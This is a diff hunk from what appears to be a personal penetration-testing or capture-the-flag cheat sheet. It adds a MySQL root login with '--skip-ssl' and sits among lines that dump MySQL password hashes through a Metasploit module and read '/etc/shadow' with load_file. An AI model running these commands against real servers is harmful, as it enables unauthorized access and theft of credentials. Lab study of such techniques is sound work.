@@ -172,6 +172,10 @@ Always open with powershell (| Username | Password | | administrator | smbserver
 28.To see hashdump in mysql > use auxiliary/scanner/mysql/mysql_hashdump 
 
 29.mysql -h $Target_IP -u root
+
+if the server has ssl error
+
+> mysql -h $Target_IP -u root --skip-ssl
 	 
 30.To see etc/shadow file in mysql database
 	 MySQL> select load_file("/etc/shadow");
